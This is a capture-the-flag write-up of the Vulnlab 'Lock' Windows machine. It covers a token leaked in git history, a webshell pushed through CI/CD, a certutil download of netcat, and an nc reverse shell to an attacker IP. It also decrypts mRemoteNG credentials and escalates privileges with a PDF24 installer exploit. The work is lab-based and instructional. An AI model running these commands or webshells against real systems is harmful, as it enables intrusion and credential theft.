---
title: "Vulnlab - Windows - Easy - Lock"
date: 2025-11-05 12:00:00 -0700
categories: [CTF, Vulnlab]
tags: [windows, git, gitea, dirbust, web discovery, rdp, mRemoteNG]
---

![Lock](/assets/img/ctf/vulnlab/easy/lock/lock.png))

# Initial Intel
* Difficulty: Easy
* OS: Windows

# tl;dr
<details><summary>Spoilers</summary>
* git clone dev-scripts repo found on :3000<br/>
* enumerate git history for ellen's personal access token<br/>
* Use the token to enumerate a private repo called 'website', then clone that repo<br/>
* the new repo will deploy changes automatically to the server on :80. Upload a revshell or webshell<br/>
* The VM may need to be reverted several times at this^ step for it to work<br/>
* After getting the foothold, enumerate ellen's files for a config file<br/>
* find the app that uses the config file. There's a tool that can be found to decrypt the creds found within<br/>
* RDP as the new user. Enumerate interesting apps on the desktop and find the version installed.<br/>
* Run the exploit from cmd to get SYSTEm<br/>
</details>

# Attack Path

## Recon

### Service Enumeration

Standard TCP scan to start:

```bash
# set host & initiate a standard tcp scan
┌──(haunter㉿kali)-[~/working/vulnhub/easy/lock]
└─$ sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full $lock
...
PORT     STATE SERVICE       REASON          VERSION                                                        
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0                                    
    |_http-title: Lock - Index                            
445/tcp  open  microsoft-ds? syn-ack ttl 127
3000/tcp open  ppp?          syn-ack ttl 127
    <title>Gitea: Git with a cup of tea</title>
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
    | rdp-ntlm-info:                                      
    |   Target_Name: LOCK                                 
    |   NetBIOS_Domain_Name: LOCK
    |   NetBIOS_Computer_Name: LOCK
    |   DNS_Domain_Name: Lock                             
    |   DNS_Computer_Name: Lock
    |   Product_Version: 10.0.20348
5357/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Notable services:

1. TCP/80 - Webserver
2. TCP/445 - SMB
3. TCP/3000 - ???/Git
4. TCP/3389 - RDP
5. TCP/5357 & 5985 - WinRM

#### TCP/80 - Webserver

![Webserver Landing Page](/assets/img/ctf/vulnlab/easy/lock/1.png)

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]          
└─$ feroxbuster --url $lock --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
```

Conducted a dirbust and file discovery. Nothing of note here.


#### TCP/445 - SMB

Performed some SMB enum. Nothing too interesting; no shared drives.

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]         
 └─$ enum4linux-ng -A $lock   
...
NetBIOS computer name: LOCK 
NetBIOS domain name: ''
DNS domain: Lock
FQDN: Lock                                            
Derived membership: workgroup member
...
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'                                    
OS release: ''                                        
OS build: '20348'  

```

#### TCP/3000 - ???/Git

Wasn't too sure initially what this was, other than mention of a Githapp. Explored in-browser and found *Gitea* is served:

```bash
http://10.10.92.132:3000/
```

![Gitea Landing Page](/assets/img/ctf/vulnlab/easy/lock/2.png)

Performed web discovery here too:

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]      
└─$ feroxbuster --url http://$lock:3000 --depth 3 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
...
http://10.10.92.132:3000/explore/repos
```

Found a repo page:

![Gitea Repositories](/assets/img/ctf/vulnlab/easy/lock/3.png)

User *ellen.freeman* has a *dev-scripts* repository available. Let's try to clone it and enumerate it for any intel.

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ git clone http://10.10.92.132:3000/ellen.freeman/dev-scripts.git                                        
Cloning into 'dev-scripts'...                                                                               
remote: Enumerating objects: 6, done.                                                                       
remote: Counting objects: 100% (6/6), done.                                                                 
remote: Compressing objects: 100% (4/4), done.                                                              
remote: Total 6 (delta 1), reused 0 (delta 0), pack-reused 0                                                
Receiving objects: 100% (6/6), done.                                                                        
Resolving deltas: 100% (1/1), done.  

┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ cd dev-scripts/

┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ git log
commit 8b78e6c3024416bce55926faa3f65421a25d6370 (HEAD -> main, origin/main, origin/HEAD)
Author: ellen.freeman <ellen.freeman@localhost.local>
Date:   Wed Dec 27 11:36:39 2023 -0800

    Update repos.py

commit dcc869b175a47ff2a2b8171cda55cb82dbddff3d
Author: ellen.freeman <ellen.freeman@localhost.local>
Date:   Wed Dec 27 11:35:42 2023 -0800

    Add repos.py


┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ git show                                                                                                                                                                                                             
commit 8b78e6c3024416bce55926faa3f65421a25d6370 (HEAD -> main, origin/main, origin/HEAD)                                                                                                                                 
Author: ellen.freeman <ellen.freeman@localhost.local>                                                                                                                                                                    
Date:   Wed Dec 27 11:36:39 2023 -0800                                                                                                                                                                                   
                                                                                                                                                                                                                         
    Update repos.py                                                                                                                                                                                                      
                                                                                                                                                                                                                         
diff --git a/repos.py b/repos.py                                                                                                                                                                                         
index dcaf2ef..e278e49 100644                                                                                                                                                                                            
--- a/repos.py                                                                                                                                                                                                           
+++ b/repos.py                                                                                                                                                                                                           
@@ -1,8 +1,6 @@                                                                                                                                                                                                          
 import requests                                                                                                                                                                                                         
 import sys                                                                                                                                                                                                              
-                                                                                                                                                                                                                        
-# store this in env instead at some point                                                                                                                                                                               
-PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'                                                                                                                                                      
+import os                                                                                                                                                                                                               
                                                                                                                                                                                                                         
 def format_domain(domain):                                                                                                                                                                                              
     if not domain.startswith(('http://', 'https://')):                                                                                                                                                                  
@@ -28,8 +26,13 @@ def main():                                                                                                                                                                                           
:...skipping...                                                                                                                                                                                                          
commit 8b78e6c3024416bce55926faa3f65421a25d6370 (HEAD -> main, origin/main, origin/HEAD)                                                                                                                                 
Author: ellen.freeman <ellen.freeman@localhost.local>
Date:   Wed Dec 27 11:36:39 2023 -0800
```

Great, I found a *personal access token* that was removed in an earlier commit:

![Git Personal Access Token](/assets/img/ctf/vulnlab/easy/lock/4.png)

We'll probably be able to use that to authenticate with the script in the repo somehow. Let's take a look at the script next.

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/dev-scripts]
└─$ python3 repos.py 
Usage: python script.py <gitea_domain>
```

![Token added to repos.py](/assets/img/ctf/vulnlab/easy/lock/6.png)

Here's where I edited the code to add the token in for authentication. Now I'll try to re-run the script:

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/dev-scripts]
└─$ python3 repos.py http://$lock:3000
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```

There's a private repo listed here, *website*. Can we clone it?

I tried to get a bit more context first so I edited the script to print the full repo's metadata array:

![Repo array metadata edit](/assets/img/ctf/vulnlab/easy/lock/8.png)

![Repo array metadata raw](/assets/img/ctf/vulnlab/easy/lock/9.png)

Here I can see the clone URL. I'll rerference that.

This repo is private and will not allow a clone with authentication, unlike the *dev-scripts* repo from earlier. I tried a couple of different methods, including curl and custom headers without any success.

Then I found the following:

[Gitea - cloning a repository](https://forum.gitea.com/t/solved-clone-repo-using-token/1816)

You can use the token as a password when cloning!


```bash
git clone http://$lock:3000/ellen.freeman/website.git
Cloning into 'website'...
Username for 'http://10.10.94.199:3000': ellen.freeman
Password for 'http://ellen.freeman@10.10.94.199:3000': 43ce39bb0bd6bc489284f2905f033ca467a6362f
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 1.08 MiB/s, done.
Resolving deltas: 100% (35/35), done.

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ cd website/

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
└─$ git status
On branch main
Your branch is up to date with 'origin/main'.

nothing to commit, working tree clean                                                                   
```

I was able to download the *website* repo. Next, I enumerated for useful intel:

![Website readme](/assets/img/ctf/vulnlab/easy/lock/readme.png)

Inside *website/readme.md* a comment states 'CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver'.

It sounds like this will be our way forward to a foothold. We can write files to this repo and then push to the webserver. Sounds like a good opportunity to deploy a webshell or revshell.

## Foothold

Let's do some git stuff and try a test deployment:

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  
└─$ git config --global user.email "ellen.freeman"                                                                                                                                                                                                      
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website] 
└─$ git config --global user.name "ellen.freeman"                                                                                                                                                                    

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  
└─$ echo "test" > test.txt                                                                                                                                                                                           

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  
└─$ git add *                                                                                                 

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  
└─$ git commit -m "adds test.txt"                                                                        

[main 236ab92] adds test.txt                                                                                
 1 file changed, 1 insertion(+)
 create mode 100644 test.txt                           

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
└─$ git push                                          
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 6 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 991 bytes | 991.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.123.175:3000/ellen.freeman/website.git 
   236ab92..aca371d  main -> main
```

![Website test.txt](/assets/img/ctf/vulnlab/easy/lock/11.png)

I was able to add a file to the live website (http://$lock/test.txt).

*NOTE / CAVEAT: This was not successful after many tries. I was 100% certain this HAD to be the way forward. I had to terminate and restart the VM multiple times and re clone the website repo before it actually worked. Frustrating.*

In any case, now having PoC that I can write to the server, I chose to deploy a webshell. Since I enumerated IIS earlier, I chose a common cmd.aspx webshell and pushed it up:

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
└─$ cp ../cmd.aspx .

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
└─$ git add *

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
└─$ git commit -m "Adds cmd.aspx webshell"
[main aca371d] Adds cmd.aspx webshell
 1 file changed, 42 insertions(+)
 create mode 100755 cmd.aspx

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
└─$ git push
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 6 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 991 bytes | 991.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.123.175:3000/ellen.freeman/website.git
   236ab92..aca371d  main -> main
```

![cmd.aspx webshell](/assets/img/ctf/vulnlab/easy/lock/12.png)

Now catching a webshell should be easy.

```bash
certutil -f -urlcache http://10.8.7.193:8000/win/nc64.exe c:\windows\temp\nc.exe

c:\windows\temp\nc.exe -nv 10.8.7.193 80 -e cmd
```

![Revshell](/assets/img/ctf/vulnlab/easy/lock/13.png)


```bash
┌──(haunter㉿kali)-[~/working/vulnlab/easy/lock]
└─$ sudo nc -lvnp 80                                                                                        
listening on [any] 80 ...
connect to [10.8.7.193] from (UNKNOWN) [10.10.123.175] 50259                                                 
PS C:\windows\system32\inetsrv> cd c:\users\
cd c:\users\                                          
PS C:\users> ls                                       
ls                                                    
    Directory: C:\users                               
Mode                 LastWriteTime         Length Name                                                      ----                 -------------         ------ ----                                                      d-----        12/27/2023   2:00 PM                .NET v4.5                                                 d-----        12/27/2023   2:00 PM                .NET v4.5 Classic                                         d-----        12/27/2023  12:01 PM                Administrator                                             d-----        12/28/2023  11:36 AM                ellen.freeman                                             d-----        12/28/2023   6:14 AM                gale.dekarios                                             d-r---        12/27/2023  10:21 AM                Public           
```
Found another user *gale.dekarios*. I'll look for interesting files next as the current user doesn't have any useful groups or privileges.

## Lateral Movement / Privilege Escalation

I found a file at *c:\users\ellen.freeman\Documents\config.xml*. Seems like an odd place for a config file so I checked it out.

![Config.xml](/assets/img/ctf/vulnlab/easy/lock/15.png)

```bash
c:\Users>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users> get-childitem -path c:\users\ -include *.txt,*.pdf,*.doc,*.docx,*.xls,*.xlsx,*.log,*.conf,*.xml -file -recurse -erroraction silentlycontinue
get-childitem -path c:\users\ -include *.txt,*.pdf,*.doc,*.docx,*.xls,*.xlsx,*.log,*.conf,*.xml -file -recurse -erroraction silentlycontinue

    Directory: C:\users\ellen.freeman\Documents

Mode                 LastWriteTime         Length Name                                                      ----                 -------------         ------ ----                                              
-a----        12/28/2023   5:59 AM           3341 config.xml    
```

![Encrypted password inside config.xml](/assets/img/ctf/vulnlab/easy/lock/16.png)

There's a password that appears to be encrypted for gale inside the file. The file indicates this is a config file for *mRemoteNG*. I searched to see if we can leverage this in anyway and found the follwing tool:

[mremoteng decrypt tool](https://github.com/gquere/mRemoteNG_password_decrypt)

The instructions say I'll need to run the tool on the entire config file. I copied it over to $attacker and tried to decrypt it:

```bash
(Penelope)─(Session [1])> download config.xml                                                                                                                                                                             
[+] Download OK '/home/haunter/.penelope/LOCK~10.10.76.201_Microsoft_Windows_Server_2022_Standard_x64-based_PC/downloads/config.xml'
```

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]    └─$ git clone https://github.com/gquere/mRemoteNG_password_decrypt.git                                      Cloning into 'mRemoteNG_password_decrypt'...                                                                                                                                                                    
remote: Enumerating objects: 11, done.                                                                      
remote: Counting objects: 100% (11/11), done.                                                               remote: Compressing objects: 100% (9/9), done.                                                              remote: Total 11 (delta 2), reused 10 (delta 2), pack-reused 0 (from 0)                                                                                                                                              
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/mRemoteNG_password_decrypt]
└─$ python3 mremoteng_decrypt.py ../config.xml 
Name: RDP/Gale
Hostname: Lock
Username: Gale.Dekarios
Password: ty8wnW9qCKDosXo6
```

Got gale's creds. Let's connect now to lateral into the account's context.

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ rdp-connect /u:gale.dekarios /p:ty8wnW9qCKDosXo6 /v:$lock
```

![Gale recon](/assets/img/ctf/vulnlab/easy/lock/17.png)

No special privileges or groups for this account either. 

Let's grab the user.txt file before further recon:

![user.txt](/assets/img/ctf/vulnlab/easy/lock/18.png)

## Root / SYSTEM

Poking around shows some app shortcuts on Gale's desktop. *PDF24* was referenced in older versions of the repos found. 

![PDF24](/assets/img/ctf/vulnlab/easy/lock/19.png)

The installed version is *11.15.1* 

Researching shows that there is an exploit for privesc that applies to this version:

[PDF24 Privesc Exploit](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/)

The instructions note that there needs to be a *msi* installer for this exploit to work correctly. I couldn't find it in either user's profile folders, C:\windows\temp, etc. I did finally find it in a hidden folder (_install*

```powershell
Get-ChildItem -Path 'C:\' -Filter '*.msi' -File -Recurse -Force -ErrorAction SilentlyContinue
...
C:\_install\pdf24-creator-11.15.1-x64.msi
```

This command, much like the one from earlier, will search for interesting files, but also searches hidden folders. 

The other piece needed is a compiled *SetOpLock.exe* file. The source code is referenced in the article here if you want to compile it yourself:

[SetOpLock source code](https://github.com/googleprojectzero/symboliclink-testing-tools)

I opted to download a pre-compiled version instead:

[SetOpLock compiled .exe](https://github.com/p1sc3s/Symlink-Tools-Compiled/blob/master/SetOpLock.exe)

Now to run the exploit. I had originally tried running this in Powershell, but had issues. It worked once I switched back to cmd:

```cmd
C:\Users\gale.dekarios> msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
```

![PDF24 Exploit](/assets/img/ctf/vulnlab/easy/lock/22.png)

1. Run the command from above
2. A dialogue box will run
3. A second cmd window will open

Per the exploit instructions, the next step is to 
* right-click on the new cmd window's title bar and select *properties*
* click on the link *legacy console mode*
* select a browser other than IE/Edge to open the link. I selected Firefox

![PDF24 Exploit 2](/assets/img/ctf/vulnlab/easy/lock/23.png)

Next, I entered *cmd.exe* in the top dir bar...

![PDF24 Exploit 3](/assets/img/ctf/vulnlab/easy/lock/24.png)

...and cmd opened as *NT Authority/SYSTEM*

![PDF24 SYSTEM](/assets/img/ctf/vulnlab/easy/lock/25.png)

After grabbing root.txt at c:\users\Administrator\Desktop\root.txt I completed Lock :)


# Lessons Learned
* Tokens can be used to authenticate to Git repos
* VMs sometimes need to be reverted multiple times. Do this if you are sure you have the correct vector
* Determine what application uses interesting files. E.g., mRemoteNG used the config.xml file we found.
* Enumerate files in hidden directories
* look for precombiled binaries if you have issues compiling source code. E.g., in Google "SetOpLock.exe" -filetype:exe
